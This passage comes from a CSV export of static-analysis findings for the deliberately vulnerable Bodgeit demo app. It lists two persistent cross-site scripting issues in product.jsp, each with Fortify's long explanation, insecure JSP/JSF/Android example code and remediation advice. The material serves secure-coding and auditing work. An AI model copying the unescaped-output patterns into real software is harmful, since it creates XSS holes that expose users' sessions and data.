decode content at certain locations within the Document Object Model (DOM) prior to passing it to the JavaScript interpreter. To reflect this danger, the rulepacks no longer treat URL encoding routines as sufficient to protect against cross-site scripting. Data values that are URL encoded and subsequently output will cause Fortify to report Cross-Site Scripting: Poor Validation vulnerabilities. 3.Fortify RTA adds protection against this category.","","",""
"DemoApps","","Bodgeit","237","Cross-Site Scripting: Persistent","","Critical","Open","2015-10-15","Fortify SCA,Checkmarx","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","root/product.jsp","","","http://localhost/root/product.jsp","","","","Abstract: <Content><Paragraph>The method <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> sends unvalidated data to a web browser on line <Replace key=""PrimaryLocation.line""/>, which can result in the browser executing malicious code.<AltParagraph>Sending unvalidated data to a web browser can result in the browser executing malicious code.</AltParagraph></Paragraph></Content> Explanation: <Content>Cross-site scripting (XSS) vulnerabilities occur when: 1. Data enters a web application through an untrusted source. In the case of Persistent (also known as Stored) XSS, the untrusted source is typically a database or other back-end datastore, while in the case of Reflected XSS it is typically a web request. <Paragraph> In this case the data enters at <Replace key=""SourceFunction"" link=""SourceLocation""/> in <Replace key=""SourceLocation.file""/> at line <Replace key=""SourceLocation.line""/>. </Paragraph> 2. The data is included in dynamic content that is sent to a web user without being validated. <Paragraph> In this case the data is sent at <Replace key=""SinkFunction"" link=""SinkLocation""/> in <Replace key=""SinkLocation.file""/> at line <Replace key=""SinkLocation.line""/>. </Paragraph> The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site. <IfNotDef var=""ConditionalDescriptions""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 1:</b> The following code segment queries a database for an employee with a given ID and prints the corresponding employee's name in the servlet response. <pre> ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } ServletOutputStream out = response.getOutputStream(); out.print(""Employee Name: "" + name); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;c:out value=""${name}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 1:</b> The following code first queries a database for an employee with a given ID, converts the results into a list, and stores the list inside <code>employeesBean</code>. <pre> public class employeesBean { private List&lt;EmployeeData&gt; employeeList; ... public List&lt;EmployeeData&gt; getEmployeeList() { ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); return convertToList(rs); } ... } </pre> Then it uses JSF's <code>dataTable</code> construct to print the corresponding employee's name. <pre> &lt;f:view&gt; ... &lt;h:dataTable value=""employeesBean.employeeList"" var=""employee""&gt; ... &lt;h:column&gt; &lt;f:facet name=""header""&gt; &lt;h:outputText value=""Employee Name""&gt; &lt;/f:facet&gt; &lt;h:outputText value=""#{employee.name}"" escape=""false""/&gt; &lt;/h:column&gt; ... &lt;/h:dataTable&gt; ... &lt;/f:view&gt;</pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> </Paragraph></IfDef> This code functions correctly when the values of <code>name</code> are well-behaved, but it does nothing to prevent exploits if they are not. This code can appear less dangerous because the value of <code>name</code> is read from a database, whose contents are apparently managed by the application. However, if the value of <code>name</code> originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with web sites that offered a ""guestbook"" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code. <IfNotDef var=""ConditionalDescriptions""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 2:</b> The following code reads an employee ID, <code>eid</code>, from an HTTP servlet request, then displays the value back to the user in the servlet's response. <pre> String eid = request.getParameter(""eid""); ... ServletOutputStream out = response.getOutputStream(); out.print(""Employee ID: "" + eid); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> Employee ID: &lt;c:out value=""${param.eid}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 2:</b> The following code reads an employee ID, <code>eid</code>, from a JSF form. <pre> ... &lt;h:form&gt; Enter employee ID: &lt;h:inputText value=""#{eid}""/&gt; &lt;/h:form&gt; ... </pre> Its response page then reads the value of <code>eid</code> and displays it to the user. <pre> ... Employee ID: &lt;h:outputText value=""#{eid}"" escape=""false""/&gt; ... </pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt;</pre> </ConditionalText> </Paragraph></IfDef> As in Example 1, this code operates correctly if <code>eid</code> contains only standard alphanumeric text. If <code>eid</code> has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS. Some think that in the mobile world, classic web application vulnerabilities, such as cross-site scripting, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication. <b>Example 3:</b> The following code enables JavaScript in Android's WebView (by default, JavaScript is disabled) and loads a page based on the value received from an Android intent. <pre> ... WebView webview = (WebView) findViewById(R.id.webview); webview.getSettings().setJavaScriptEnabled(true); String url = this.getIntent().getExtras().getString(""url""); webview.loadUrl(url); ... </pre> If the value of <code>url</code> starts with <code>javascript:</code>, JavaScript code that follows will execute within the context of the web page inside WebView. As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim: - As in Example 1, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. - As in Example 2, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user's machine to the attacker or perform other nefarious activities. - As in Example 3, a source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content. <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""tracenode:form field validator tracenode:action form declaration tracenode:action declaration tracenode:action field validator tracenode:command class validator"">A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.</ConditionalText> </Paragraph></IfDef> <IfNotDef var=""ConditionalDescriptions""> A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input. </IfNotDef></Content>","Recommendations: <Content>The solution to XSS is to ensure that validation occurs in the correct places and checks for the correct properties. Since XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS. Web applications must validate their input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application may accept input through a shared data store or other trusted source, and that data store may accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user. The most secure approach to validation for XSS is to create a whitelist of safe characters that are allowed to appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alpha-numeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser should still be considered valid input once they are encoded, such as a web design bulletin board that must accept HTML fragments from its users. A more flexible, but less secure approach is known as blacklisting, which selectively rejects or escapes potentially dangerous characters before using the input. In order to form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines what characters have special meaning, many web browsers try to correct common mistakes in HTML and may treat other characters as special in certain contexts, which is why we do not encourage the use of blacklists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]: In the content of a block-level element (in the middle of a paragraph of text): - ""&lt;"" is special because it introduces a tag. - ""&amp;"" is special because it introduces a character entity. - ""&gt;"" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening ""&lt;"", but omitted it in error. The following principles apply to attribute values: - In attribute values enclosed with double quotes, the double quotes are special because they mark the end of the attribute value. - In attribute values enclosed with single quote, the single quotes are special because they mark the end of the attribute value. - In attribute values without any quotes, white-space characters, such as space and tab, are special. - ""&amp;"" is special when used with certain attributes, because it introduces a character entity. In URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters: - Space, tab, and new line are special because they mark the end of the URL. - ""&amp;"" is special because it either introduces a character entity or separates CGI parameters. - Non-ASCII characters (that is, everything above 128 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context. - The ""%"" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, ""%"" must be filtered if input such as ""%68%65%6C%6C%6F"" becomes ""hello"" when it appears on the web page in question. Within the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;: - Semicolons, parentheses, curly braces, and new line characters should be filtered out in situations where text could be inserted directly into a pre-existing script tag. Server-side scripts: - Server-side scripts that convert any exclamation characters (!) in input to double-quote characters ("") on output might require additional filtering. Other possibilities: - If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and may bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7). Once you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option in this situation is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and may be unacceptable in circumstances where the integrity of the input must be preserved for display. If input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2]. Many application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. When an application is developed there are no guarantees about what application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will also stay in sync.</Content> Tips: 1.The HPE Security Fortify Secure Coding Rulepacks warn about SQL Injection and Access Control: Database issues when untrusted data is written to a database and also treat the database as a source of untrusted data, which can lead to XSS vulnerabilities. If the database is a trusted resource in your environment, use custom filters to filter out dataflow issues that include the DATABASE taint flag or originate from database sources. Nonetheless, it is often still a good idea to validate everything read from the database. 2.Even though URL encoding untrusted data protects against many XSS attacks, some browsers (specifically, Internet Explorer 6 and 7 and possibly others) automatically decode content at certain locations within the Document Object Model (DOM) prior to passing it to the JavaScript interpreter. To reflect this danger, the rulepacks no longer treat URL encoding routines as sufficient to protect against cross-site scripting. Data values that are URL encoded and subsequently output will cause Fortify to report Cross-Site Scripting: Poor Validation vulnerabilities. 3.Fortify RTA adds protection against this category.","","",""
"DemoApps","","Bodgeit","247","Cross-Site Scripting: Persistent","","Critical","Open","2015-10-15","Fortify SCA,Checkmarx","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","root/product.jsp","","","http://localhost/root/product.jsp","","","","Abstract: <Content><Paragraph>The method <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> sends unvalidated data to a web browser on line <Replace key=""PrimaryLocation.line""/>, which can result in the browser executing malicious code.<AltParagraph>Sending unvalidated data to a web browser can result in the browser executing malicious code.</AltParagraph></Paragraph></Content> Explanation: <Content>Cross-site scripting (XSS) vulnerabilities occur when: 1. Data enters a web application through an untrusted source. In the case of Persistent (also known as Stored) XSS, the untrusted source is typically a database or other back-end datastore, while in the case of Reflected XSS it is typically a web request. <Paragraph> In this case the data enters at <Replace key=""SourceFunction"" link=""SourceLocation""/> in <Replace key=""SourceLocation.file""/> at line <Replace key=""SourceLocation.line""/>. </Paragraph> 2. The data is included in dynamic content that is sent to a web user without being validated. <Paragraph> In this case the data is sent at <Replace key=""SinkFunction"" link=""SinkLocation""/> in <Replace key=""SinkLocation.file""/> at line <Replace key=""SinkLocation.line""/>. </Paragraph> The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site. <IfNotDef var=""ConditionalDescriptions""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 1:</b> The following code segment queries a database for an employee with a given ID and prints the corresponding employee's name in the servlet response. <pre> ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } ServletOutputStream out = response.getOutputStream(); out.print(""Employee Name: "" + name); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;c:out value=""${name}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 1:</b> The following code first queries a database for an employee with a given ID, converts the results into a list, and stores the list inside <code>employeesBean</code>. <pre> public class employeesBean { private List&lt;EmployeeData&gt; employeeList; ... public List&lt;EmployeeData&gt; getEmployeeList() { ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); return convertToList(rs); } ... } </pre> Then it uses JSF's <code>dataTable</code> construct to print the corresponding employee's name. <pre> &lt;f:view&gt; ... &lt;h:dataTable value=""employeesBean.employeeList"" var=""employee""&gt; ... &lt;h:column&gt; &lt;f:facet name=""header""&gt; &lt;h:outputText value=""Employee Name""&gt; &lt;/f:facet&gt; &lt;h:outputText value=""#{employee.name}"" escape=""false""/&gt; &lt;/h:column&gt; ... &lt;/h:dataTable&gt; ... &lt;/f:view&gt;</pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> </Paragraph></IfDef> This code functions correctly when the values of <code>name</code> are well-behaved, but it does nothing to prevent exploits if they are not. This code can appear less dangerous because the value of <code>name</code> is read from a database, whose contents are apparently managed by the application. However, if the value of <code>name</code> originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with web sites that offered a ""guestbook"" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code. <IfNotDef var=""ConditionalDescriptions""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 2:</b> The following code reads an employee ID, <code>eid</code>, from an HTTP servlet request, then displays the value back to the user in the servlet's response. <pre> String eid = request.getParameter(""eid""); ... ServletOutputStream out = response.getOutputStream(); out.print(""Employee ID: "" + eid); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> Employee ID: &lt;c:out value=""${param.eid}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 2:</b> The following code reads an employee ID, <code>eid</code>, from a JSF form. <pre> ... &lt;h:form&gt; Enter employee ID: &lt;h:inputText value=""#{eid}""/&gt; &lt;/h:form&gt; ... </pre> Its response page then reads the value of <code>eid</code> and displays it to the user. <pre> ... Employee ID: &lt;h:outputText value=""#{eid}"" escape=""false""/&gt; ... </pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt;</pre> </ConditionalText> </Paragraph></IfDef> As in Example 1, this code operates correctly if <code>eid</code> contains only standard alphanumeric text. If <code>eid</code> has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS. Some think that in the mobile world, classic web application vulnerabilities, such as cross-site scripting, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication. <b>Example 3:</b> The following code enables JavaScript in Android's WebView (by default, JavaScript is disabled) and loads a page based on the value received from an Android intent. <pre> ... WebView webview = (WebView) findViewById(R.id.webview); webview.getSettings().setJavaScriptEnabled(true); String url = this.getIntent().getExtras().getString(""url""); webview.loadUrl(url); ... </pre> If the value of <code>url</code> starts with <code>javascript:</code>, JavaScript code that follows will execute within the context of the web page inside WebView. As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim: - As in Example 1, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. - As in Example 2, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user's machine to the attacker or perform other nefarious activities. - As in Example 3, a source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content. <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""tracenode:form field validator tracenode:action form declaration tracenode:action declaration tracenode:action field validator tracenode:command class validator"">A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.</ConditionalText> </Paragraph></IfDef> <IfNotDef var=""ConditionalDescriptions""> A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input. </IfNotDef></Content>","Recommendations: <Content>The solution to XSS is to ensure that validation occurs in the correct places and checks for the correct properties. Since XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS. Web applications must validate their input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application may accept input through a shared data store or other trusted source, and that data store may accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user. The most secure approach to validation for XSS is to create a whitelist of safe characters that are allowed to appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alpha-numeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser should still be considered valid input once they are encoded, such as a web design bulletin board that must accept HTML fragments from its users. A more flexible, but less secure approach is known as blacklisting, which selectively rejects or escapes potentially dangerous characters before using the input. In order to form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines what characters have special meaning, many web browsers try to correct common mistakes in HTML and may treat other characters as special in certain contexts, which is why we do not encourage the use of blacklists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]: In the content of a block-level element (in the middle of a paragraph of text): - ""&lt;"" is special because it introduces a tag. - ""&amp;"" is special because it introduces a character entity. - ""&gt;"" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening ""&lt;"", but omitted it in error. The following principles apply to attribute values: - In attribute values enclosed with double quotes, the double quotes are special because they mark the end of the attribute value. - In attribute values enclosed with single quote, the single quotes are special because they mark the end of the attribute value. - In attribute values without any quotes, white-space characters, such as space and tab, are special. - ""&amp;"" is special when used with certain attributes, because it introduces a character entity. In URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters: - Space, tab, and new line are special because they mark the end of the URL. - ""&amp;"" is special because it either introduces a character entity or separates CGI parameters. - Non-ASCII characters (that is, everything above 128 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context. - The ""%"" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, ""%"" must be filtered if input such as ""%68%65%6C%6C%6F"" becomes ""hello"" when it appears on the web page in question. Within the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;: - Semicolons, parentheses, curly braces, and new line characters should be filtered out in situations where text 